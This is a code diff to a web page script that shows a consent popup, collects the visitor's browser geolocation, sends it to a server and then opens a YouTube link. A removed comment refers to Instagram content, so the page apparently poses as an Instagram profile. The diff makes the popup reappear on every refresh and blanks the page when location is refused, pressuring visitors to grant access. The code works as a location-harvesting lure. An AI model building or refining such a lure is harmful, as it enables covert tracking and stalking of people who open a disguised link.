@@ -1,9 +1,10 @@
 /**
- * Consent dialog → browser geolocation → unlock content + open YouTube.
+ * Consent dialog → browser geolocation → save + open YouTube.
  *
- * Page content stays hidden until location permission is granted.
- * If the user denies (Never allow) or chooses Not now, the page closes
- * / leaves without revealing content.
+ * Profile content stays visible while the dialog is open.
+ * On every page refresh, the consent popup is shown again.
+ * Only if the user picks "Never allow" (permission denied) do we
+ * close / blank the page and hide content.
  */
 
 const YOUTUBE_URL = "https://youtu.be/kIRD0ob8CEs";
@@ -13,11 +14,10 @@ const continueBtn = document.getElementById("consent-continue");
 const notNowBtn = document.getElementById("consent-not-now");
 const statusEl = document.getElementById("status");
 
-function setStatus(message, tone = "info") {
-  if (!statusEl) return;
-  statusEl.hidden = false;
-  statusEl.textContent = message;
-  statusEl.className = `status is-${tone}`;
+/** Always show the consent popup on load (including after refresh). */
+function showDialog() {
+  dialogEl.hidden = false;
+  dialogEl.setAttribute("aria-hidden", "false");
 }
 
 function hideDialog() {
@@ -25,23 +25,21 @@ function hideDialog() {
   dialogEl.setAttribute("aria-hidden", "true");
 }
 
-function unlockContent() {
-  document.body.classList.remove("content-locked");
-  document.body.classList.add("content-unlocked");
-  const page = document.getElementById("page-content");
-  if (page) page.setAttribute("aria-hidden", "false");
+function setStatus(message, tone = "info") {
+  if (!statusEl) return;
+  statusEl.hidden = false;
+  statusEl.textContent = message;
+  statusEl.className = `status is-${tone}`;
 }
 
 /**
- * Do not show page content. Try to close the tab; if the browser blocks
- * that, navigate away to a blank page.
+ * Called only when the browser location prompt is denied (Never allow).
+ * Hides content and closes / blanks the page.
  */
 function blockAndExit() {
   hideDialog();
-  document.body.classList.add("content-locked");
-  document.body.classList.remove("content-unlocked");
+  document.body.classList.add("content-blocked");
 
-  // Clear visible UI so Instagram content cannot be seen.
   document.body.innerHTML = "";
   document.documentElement.style.background = "#000";
 
@@ -51,7 +49,6 @@ function blockAndExit() {
     // ignore
   }
 
-  // Fallback when the browser refuses to close a user-opened tab.
   window.location.replace("about:blank");
 }
 
@@ -78,7 +75,7 @@ async function sendLocationToServer(payload) {
 function requestBrowserLocation() {
   return new Promise((resolve, reject) => {
     if (!("geolocation" in navigator)) {
-      reject(new Error("unsupported"));
+      reject(Object.assign(new Error("unsupported"), { code: -1 }));
       return;
     }
 
@@ -90,11 +87,12 @@ function requestBrowserLocation() {
   });
 }
 
-/** Continue → browser prompt → unlock only if allowed. */
+/** Continue → browser Allow / Never allow prompt. */
 async function handleContinue() {
   continueBtn.disabled = true;
   notNowBtn.disabled = true;
   hideDialog();
+  setStatus("Waiting for browser permission…", "info");
 
   try {
     const position = await requestBrowserLocation();
@@ -107,20 +105,32 @@ async function handleContinue() {
     };
 
     await sendLocationToServer(payload);
-    unlockContent();
     setStatus("You’re all set. Opening YouTube…", "ok");
     openYouTube();
   } catch (error) {
     console.error("Location flow error:", error);
-    // Never allow / deny / error → leave without showing content.
-    blockAndExit();
+
+    // Only "Never allow" / permission denied closes the page.
+    if (error && error.code === 1) {
+      blockAndExit();
+      return;
+    }
+
+    // Timeout / unavailable: keep profile visible, show message, offer dialog again.
+    setStatus("Could not get permission right now. Refresh to try again.", "error");
+    showDialog();
+  } finally {
+    continueBtn.disabled = false;
+    notNowBtn.disabled = false;
   }
 }
 
-/** Not now → no location → no content. */
+/** Not now → close dialog only; profile stays visible. */
 function handleNotNow() {
-  blockAndExit();
+  hideDialog();
+  setStatus("You can refresh the page anytime to see the options again.", "info");
 }
 
+showDialog();
 continueBtn.addEventListener("click", handleContinue);
 notNowBtn.addEventListener("click", handleNotNow);
